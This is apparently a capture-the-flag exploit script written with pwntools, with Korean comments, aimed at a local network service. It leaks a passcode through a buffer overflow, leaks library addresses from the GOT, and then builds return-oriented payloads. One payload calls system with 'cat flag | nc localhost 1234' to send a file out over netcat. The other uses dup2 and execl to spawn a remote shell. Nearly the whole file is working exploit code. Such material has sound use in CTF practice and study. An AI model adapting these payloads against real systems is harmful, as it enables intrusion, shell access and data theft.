#-*-coding:utf-8-*-

from pwn import *

exit = 0x80487f0
pop2ret = 0x804917e
pop4ret = 0x804917c
bss = 0x804b088

def leak_passcode(r):
    r.recvuntil("> ")
    r.sendline("target")
    r.recvuntil("---> ")
    r.sendline("12345678/12345678")
    r.recvuntil("> ")
    r.sendline("A"*0x200)
    pre_passcode = r.recvuntil("> ")
    return pre_passcode[0x200+30:-3]

#####################################

def leak_libpt(r):
    # recv@plt = 0x80488e0
    # recv@got = 0x804b074
    # send@plt = 0x8048900
    # send@got = 0x804b07c
    
    payload = "b"*(512+12+4)
    payload += p32(0x8048900) # send@plt
    payload += p32(0x80487f0) # exit@plt
    payload += p32(4) # sockfd
    payload += p32(0x804b074)
    payload += p32(8)
    payload += p32(0)
    # 여기서 clean 안해주면, 100(count)이 같이 수신된다.
    r.clean()
    r.sendline(payload)
    
    recv_got = r.recvall()
    for i in range(len(recv_got)//4):
        print(hex(u32(recv_got[i*4:(i+1)*4])))


def exploit_libpt(r, libpt_base):
    system_offset = 0x0000f0b0
    shell = "cat flag | nc localhost 1234"
    
    print("system@libpt : ", hex(libpt_base + system_offset))
    payload = "b"*(512)
    payload += p32(4) # 아래에서 recvuntil로 받으려면 fd 훼손되면 안됨.
    payload += "b"*(12)
    payload += p32(0x80488e0) #recv@plt
    payload += p32(pop4ret)
    payload += p32(4)
    payload += p32(bss)
    payload += p32(len(shell))
    payload += p32(0)
    payload += p32(libpt_base+system_offset)
    payload += p32(exit)
    payload += p32(bss)
    
    r.sendline(payload)
    print(r.recvuntil("Luck!")) # sleep으로 처리해도 된다.
    r.sendline(shell)

    
############################

def leak_libc(r):
    # fclose@got = 0x804b014

    payload = "b"*(512+12+4)
    payload += p32(0x8048900) # send@plt
    payload += p32(0x80487f0) # exit@plt
    
    payload += p32(4) # sockfd
    payload += p32(0x804b014)
    
    payload += p32(8)
    payload += p32(0)
    
    r.clean()
    r.sendline(payload)
    
    fclose_got = r.recvall()
    for i in range(len(fclose_got)//4):
        print(hex(u32(fclose_got[i*4:(i+1)*4])))

def exploit_libc(r, libc_base):
    execl = libc_base + 0xb6220
    dup2 = libc_base +  0xdb920
    binsh = libc_base + 0x16084C

    print("execl@libc : ", hex(execl))
    print("dup2@libc : ", hex(dup2))
    payload = "b"*(512)
    payload += p32(4)
    payload += "b"*(12)
    payload += p32(dup2)
    payload += p32(pop2ret)
    payload += p32(4)
    payload += p32(0)
    payload += p32(dup2)
    payload += p32(pop2ret)
    payload += p32(4)
    payload += p32(1)
    payload += p32(execl)
    payload += p32(exit)
    payload += p32(binsh)
    payload += p32(0)
    
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    r = remote("127.0.0.1", 1129)
    
    passcode = leak_passcode(r)
    r.clean()
    r.sendline("launch")
    r.recvuntil(": ")
    r.send(passcode)
    r.recvuntil(": ")
    

    '''libpt : system@libpt + nc'''    
    # leak_libpt(r) # recv@libpt = 0xf76d70a0
    # libpt_base = 0xf76d70a0 - 0x0000e0a0 # remote이면 알아내기 어렵다.
    # exploit_libpt(r, libpt_base)


    '''libc : execl + dup2'''
    leak_libc(r) # fclose@libc = 0xf757d4f0
    # ./find fclose 4f0 ==> libc6_2.19-0ubuntu6.13_i386
    # libc_base = 0xf757d4f0 - 0x634f0
    # exploit_libc(r, libc_base)
    
